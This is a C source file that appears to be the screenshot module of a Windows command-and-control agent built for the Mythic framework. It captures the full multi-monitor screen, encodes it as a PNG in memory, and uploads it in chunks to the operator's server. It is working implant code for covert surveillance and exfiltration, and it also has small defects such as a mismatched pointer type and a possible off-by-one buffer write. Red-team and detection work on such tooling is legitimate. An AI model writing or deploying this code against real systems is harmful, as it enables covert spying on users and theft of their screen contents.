#include "Tasks/Screenshot.h"

#include <windows.h>
#include <objbase.h>   // CoInitialize
#include <objidl.h>    // IStream, CreateStreamOnHGlobal

#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#include <gdiplus.h>

#ifdef INCLUDE_CMD_SCREENSHOT

#define CHUNK_SIZE  512000      // 512 KB

/**
 * @brief Initialize a file download and return file UUID.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD ScreenshotInit(_In_ PCHAR taskUuid, _Inout_ SCREENSHOT_DOWNLOAD* download)
{
    DWORD Status = 0;

    // Calculate total chunks (rounded up)
    download->totalChunks = (DWORD)((download->screenshot_size + CHUNK_SIZE - 1) / CHUNK_SIZE);

    // Prepare package
    PPackage data = PackageInit(DOWNLOAD_INIT, TRUE);
    PackageAddString(data, taskUuid, FALSE);
    PackageAddInt32(data, download->totalChunks);
    PackageAddString(data, download->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);
    PackageAddByte(data, 1); // is_screenshot = True

    // Send package
    PARSER Response = { 0 };
    PackageSend(data, &Response);

    BYTE status = ParserGetByte(&Response);
    if (status == FALSE)
    {
        _err("DownloadInit returned failure status : 0x%hhx", status);
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    SIZE_T lenUuid  = TASK_UUID_SIZE;
    PCHAR uuid = ParserGetString(&Response, &lenUuid);
    if (uuid == NULL) 
    {
        _err("Failed to get UUID from response.");
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    strncpy(download->fileUuid, uuid, TASK_UUID_SIZE + 1);
    download->fileUuid[TASK_UUID_SIZE + 1] = '\0';    // null-termination

end:
    // Cleanup
    if (data) PackageDestroy(data);
    if (&Response) ParserDestroy(&Response);

    return Status;
}

/**
 * @brief Send b64 chunks of a file to Mythic server
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD ScreenshotContinue(_In_ PCHAR taskUuid, _Inout_ SCREENSHOT_DOWNLOAD* download)
{
    DWORD Status = 0;
    char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);

    if (!chunkBuffer)
    {
        DWORD error = GetLastError();
        _err("Memory allocation failed. ERROR CODE: %d", error);
        goto cleanup;
    }

    download->currentChunk = 1;

    DWORD remaining = download->screenshot_size;
    while (download->currentChunk <= download->totalChunks)
    {
        DWORD bytesRead = 0;
        if(remaining < CHUNK_SIZE)
            bytesRead = remaining;
        else
            bytesRead = CHUNK_SIZE;

        _dbg("Sending chunk %d/%d (size: %d)", download->currentChunk, download->totalChunks, bytesRead);

        // Prepare package
        PPackage cur = PackageInit(DOWNLOAD_CONTINUE, TRUE);
        PackageAddString(cur, taskUuid, FALSE);
        PackageAddInt32(cur, download->currentChunk);
        PackageAddBytes(cur, download->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddBytes(cur, download->screenshot_data + (download->currentChunk-1)*CHUNK_SIZE, bytesRead, TRUE);
        PackageAddInt32(cur, bytesRead);

        remaining -= bytesRead;

        // Send chunk
        PARSER Response = { 0 };
        PackageSend(cur, &Response);

        BYTE success = ParserGetByte(&Response);
        if (success == FALSE)
        {
            _err("Download chunk %d failed.", download->currentChunk);
            Status = ERROR_MYTHIC_DOWNLOAD;
            PackageDestroy(cur);
            ParserDestroy(&Response);
            goto cleanup;
        }

        download->currentChunk++;

        PackageDestroy(cur);
        ParserDestroy(&Response);
    }

cleanup:
    if (chunkBuffer) LocalFree(chunkBuffer);

    return Status;
}

/* Return 0 on success, -1 on failure */
static int GetEncoderClsidW(const WCHAR* mimeType, CLSID* pClsid) {
    UINT num = 0, size = 0;
    if (GdipGetImageEncodersSize(&num, &size) != Ok || size == 0) return -1;

    ImageCodecInfo* pInfo = (ImageCodecInfo*)malloc(size);
    if (!pInfo) return -1;

    if (GdipGetImageEncoders(num, size, pInfo) != Ok) {
        free(pInfo);
        return -1;
    }

    for (UINT i = 0; i < num; ++i) {
        if (pInfo[i].MimeType && wcscmp(pInfo[i].MimeType, mimeType) == 0) {
            *pClsid = pInfo[i].Clsid;
            free(pInfo);
            return 0;
        }
    }
    free(pInfo);
    return -1;
}

char* screenshot_data(int* size) {
    if (size) *size = 0;

    // Init COM (for IStream) and make process DPI-aware (optional but helps on HiDPI)
    if (FAILED(CoInitialize(NULL))) return NULL;
    SetProcessDPIAware();

    // Get virtual screen bounds (handles multi-monitor setups)
    int x_start = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y_start = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width   = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height  = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    if (!hScreen) { CoUninitialize(); return NULL; }

    HDC hDC = CreateCompatibleDC(hScreen);
    if (!hDC) { ReleaseDC(NULL, hScreen); CoUninitialize(); return NULL; }

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    if (!hBitmap) {
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, x_start, y_start, SRCCOPY);

    // Init GDI+
    ULONG_PTR gdipToken = 0;
    GdiplusStartupInput gdipInput;
    gdipInput.GdiplusVersion = 1;
    gdipInput.DebugEventCallback = NULL;
    gdipInput.SuppressBackgroundThread = FALSE;
    gdipInput.SuppressExternalCodecs = FALSE;

    if (GdiplusStartup(&gdipToken, &gdipInput, NULL) != Ok) {
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    // Create a COM stream on a movable HGLOBAL
    IStream* stream = NULL;
    if (FAILED(CreateStreamOnHGlobal(NULL, TRUE, &stream))) {
        GdiplusShutdown(gdipToken);
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    // Wrap HBITMAP into a GDI+ bitmap and save as PNG to the stream
    GpBitmap* gpBmp = NULL;
    if (GdipCreateBitmapFromHBITMAP(hBitmap, 0, &gpBmp) != Ok || gpBmp == NULL) {
        stream->lpVtbl->Release(stream);
        GdiplusShutdown(gdipToken);
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    CLSID pngClsid;
    if (GetEncoderClsidW(L"image/png", &pngClsid) != 0) {
        GdipDisposeImage((GpImage*)gpBmp);
        stream->lpVtbl->Release(stream);
        GdiplusShutdown(gdipToken);
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    if (GdipSaveImageToStream((GpImage*)gpBmp, stream, &pngClsid, NULL) != Ok) {
        GdipDisposeImage((GpImage*)gpBmp);
        stream->lpVtbl->Release(stream);
        GdiplusShutdown(gdipToken);
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    // Rewind stream and determine its size
    LARGE_INTEGER zero;
    zero.QuadPart = 0;
    ULARGE_INTEGER newPos;
    if (FAILED(stream->lpVtbl->Seek(stream, zero, STREAM_SEEK_SET, &newPos))) {
    //if (FAILED(IStream_Seek(stream, zero, STREAM_SEEK_SET, &newPos))) {
        GdipDisposeImage((GpImage*)gpBmp);
        stream->lpVtbl->Release(stream);
        GdiplusShutdown(gdipToken);
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    STATSTG stat;
    if (FAILED(stream->lpVtbl->Stat(stream, &stat, STATFLAG_NONAME))) {
    //if (FAILED(IStream_Stat(stream, &stat, STATFLAG_NONAME))) {
        GdipDisposeImage((GpImage*)gpBmp);
        stream->lpVtbl->Release(stream);
        GdiplusShutdown(gdipToken);
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    DWORD len = (DWORD)stat.cbSize.LowPart;
    char* data = (char*)malloc(len ? len : 1);
    if (!data) {
        GdipDisposeImage((GpImage*)gpBmp);
        stream->lpVtbl->Release(stream);
        GdiplusShutdown(gdipToken);
        SelectObject(hDC, old_obj);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        CoUninitialize();
        return NULL;
    }

    // Read PNG bytes into memory
    ULONG bytesRead = 0;
    HRESULT hr = stream->lpVtbl->Read(stream, data, len, &bytesRead);
    //IStream_Read(stream, data, len, &bytesRead);

    // Cleanup GDI+, GDI, COM objects
    GdipDisposeImage((GpImage*)gpBmp);
    stream->lpVtbl->Release(stream);
    GdiplusShutdown(gdipToken);
    SelectObject(hDC, old_obj);
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    CoUninitialize();

    if (FAILED(hr) || bytesRead != len) {
        free(data);
        if (size) *size = 0;
        return NULL;
    }

    if (size) *size = (int)len;
    return data;
}

/**
 * @brief Main command function for downloading a file from agent.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given tasks data buffer
 * 
 * @return VOID
 */
VOID Screenshot(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{    
    SIZE_T pathLen      = 0;
    DWORD status;
    SCREENSHOT_DOWNLOAD fd    = { 0 };

    // Perform screenshot
    size_t dataSize;
    unsigned char* pixels = screenshot_data(&dataSize);

    if (pixels == NULL)
    {
        PackageError(taskUuid, ERROR_INVALID_HANDLE);
        goto end;
    }
    
    fd.screenshot_data = pixels;
    fd.screenshot_size = dataSize;

    strncpy(fd.filepath, "screenshot.png", 14);

    // Prepare to send
    status = ScreenshotInit(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    _dbg("Sending screenshot FilePath:\"%s\" - ID:%s", fd.filepath, fd.fileUuid);

    // Transfer chunked file
    status = ScreenshotContinue(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    PackageComplete(taskUuid, NULL);

end:
    // Cleanup
    //if (fd.scr) CloseHandle(fd.hFile);
    if (pixels != NULL)
        free(pixels);
    
}

/**
 * @brief Thread entrypoint for Download function. 
 * 
 * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
 * 
 * @return DWORD WINAPI
 */
DWORD WINAPI ScreenshotThread(_In_ LPVOID lpTaskParamter)
{
    _dbg("Thread started.");

    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;

    Screenshot(tp->TaskUuid, tp->TaskParser);
    
    _dbg("Screenshot Thread cleaning up now...");
    // Cleanup things used for thread
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);  
    return 0;
}



#endif  //INCLUDE_CMD_DOWNLOAD
